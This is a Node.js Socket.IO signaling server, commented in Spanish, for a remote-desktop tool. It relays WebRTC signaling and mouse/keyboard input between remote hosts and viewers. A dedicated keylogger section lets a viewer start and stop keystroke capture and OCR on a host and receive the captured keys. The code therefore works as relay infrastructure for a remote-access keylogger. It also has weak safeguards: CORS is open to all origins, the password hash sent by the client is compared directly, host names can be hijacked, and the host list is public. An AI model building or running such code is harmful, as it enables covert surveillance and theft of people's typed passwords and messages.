const express = require("express");
const http    = require("http");
const { Server } = require("socket.io");
const cors    = require("cors");

const app    = express();
const server = http.createServer(app);
const PORT   = process.env.PORT || 3000;

const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.use(cors());
app.use(express.json());

// ── State ─────────────────────────────────────────────────────────────────────
// hosts[name] = { socketId, passwordHash, viewerSocketId | null }
const hosts = new Map();
// socketId → hostName (reverse lookup)
const socketToHost = new Map();
// viewerSocketId → hostName
const viewerToHost = new Map();

// ── Health ────────────────────────────────────────────────────────────────────
app.get("/health", (req, res) => {
  const hostList = [];
  for (const [name, h] of hosts.entries()) {
    hostList.push({ name, connected: !!h.socketId, hasViewer: !!h.viewerSocketId });
  }
  res.json({ status: "ok", hosts: hostList, uptime: Math.floor(process.uptime()) });
});

// ── Sockets ───────────────────────────────────────────────────────────────────
io.on("connection", (socket) => {
  console.log(`[conn] ${socket.id}`);

  // ── Host se registra con nombre y hash de contraseña ─────────────────────
  socket.on("host:register", (data) => {
    const { name, passwordHash } = data || {};
    if (!name || !passwordHash) return;

    // Si ya había un host con ese nombre, desconectarlo
    const existing = hosts.get(name);
    if (existing && existing.socketId) {
      socketToHost.delete(existing.socketId);
    }

    hosts.set(name, { socketId: socket.id, passwordHash, viewerSocketId: null });
    socketToHost.set(socket.id, name);
    console.log(`[host] "${name}" registrado: ${socket.id}`);
  });

  // ── Viewer pide lista de hosts disponibles ────────────────────────────────
  socket.on("viewer:list", () => {
    const list = [];
    for (const [name, h] of hosts.entries()) {
      list.push({ name, online: !!h.socketId, busy: !!h.viewerSocketId });
    }
    socket.emit("viewer:hosts", list);
  });

  // ── Viewer intenta conectar a un host con contraseña ──────────────────────
  socket.on("viewer:join", ({ name, passwordHash }) => {
    const host = hosts.get(name);

    if (!host) {
      return socket.emit("error", { message: `PC "${name}" no encontrada o no conectada.` });
    }
    if (!host.socketId) {
      return socket.emit("error", { message: `PC "${name}" no está conectada.` });
    }
    if (host.passwordHash !== passwordHash) {
      return socket.emit("error", { message: "Contraseña incorrecta." });
    }
    if (host.viewerSocketId) {
      return socket.emit("error", { message: `PC "${name}" ya tiene una sesión activa.` });
    }

    host.viewerSocketId = socket.id;
    viewerToHost.set(socket.id, name);

    io.to(host.socketId).emit("host:viewer-joined");
    socket.emit("viewer:ready", { name });
    console.log(`[viewer] Conectado a "${name}": ${socket.id}`);
  });

  // ── WebRTC signaling ──────────────────────────────────────────────────────
  socket.on("signal:offer", ({ offer }) => {
    const name = socketToHost.get(socket.id);
    const host = hosts.get(name);
    if (host?.viewerSocketId) io.to(host.viewerSocketId).emit("signal:offer", { offer });
  });

  socket.on("signal:answer", ({ answer }) => {
    const name = viewerToHost.get(socket.id);
    const host = hosts.get(name);
    if (host?.socketId) io.to(host.socketId).emit("signal:answer", { answer });
  });

  socket.on("signal:ice", ({ candidate }) => {
    const isHost = socketToHost.has(socket.id);
    if (isHost) {
      const host = hosts.get(socketToHost.get(socket.id));
      if (host?.viewerSocketId) io.to(host.viewerSocketId).emit("signal:ice", { candidate });
    } else {
      const name = viewerToHost.get(socket.id);
      const host = hosts.get(name);
      if (host?.socketId) io.to(host.socketId).emit("signal:ice", { candidate });
    }
  });

  // ── Input (viewer → host) ─────────────────────────────────────────────────
  socket.on("input:event", (data) => {
    const name = viewerToHost.get(socket.id);
    const host = hosts.get(name);
    if (host?.socketId) io.to(host.socketId).emit("input:event", data);
  });

  // ── Keylogger ─────────────────────────────────────────────────────────────
  socket.on("keylog:start", () => {
    const name = viewerToHost.get(socket.id);
    const host = hosts.get(name);
    if (host?.socketId) io.to(host.socketId).emit("keylog:start");
  });

  socket.on("keylog:stop", () => {
    const name = viewerToHost.get(socket.id);
    const host = hosts.get(name);
    if (host?.socketId) io.to(host.socketId).emit("keylog:stop");
  });

  socket.on("keylog:ocr_toggle", ({ enabled }) => {
    const name = viewerToHost.get(socket.id);
    const host = hosts.get(name);
    if (host?.socketId) io.to(host.socketId).emit("keylog:ocr_toggle", { enabled });
  });

  socket.on("keylog:key", (data) => {
    const name = socketToHost.get(socket.id);
    const host = hosts.get(name);
    if (host?.viewerSocketId) io.to(host.viewerSocketId).emit("keylog:key", data);
  });

  // ── Disconnect ────────────────────────────────────────────────────────────
  socket.on("disconnect", () => {
    // Era un host
    if (socketToHost.has(socket.id)) {
      const name = socketToHost.get(socket.id);
      const host = hosts.get(name);
      if (host) {
        if (host.viewerSocketId) {
          io.to(host.viewerSocketId).emit("error", { message: `PC "${name}" se desconectó.` });
          viewerToHost.delete(host.viewerSocketId);
        }
        host.socketId      = null;
        host.viewerSocketId = null;
      }
      socketToHost.delete(socket.id);
      console.log(`[host] "${name}" desconectado.`);
    }

    // Era un viewer
    if (viewerToHost.has(socket.id)) {
      const name = viewerToHost.get(socket.id);
      const host = hosts.get(name);
      if (host) {
        host.viewerSocketId = null;
        if (host.socketId) io.to(host.socketId).emit("host:viewer-left");
      }
      viewerToHost.delete(socket.id);
      console.log(`[viewer] Desconectado de "${name}".`);
    }
  });
});

server.listen(PORT, () => console.log(`✅ Signaling server en puerto ${PORT}`));
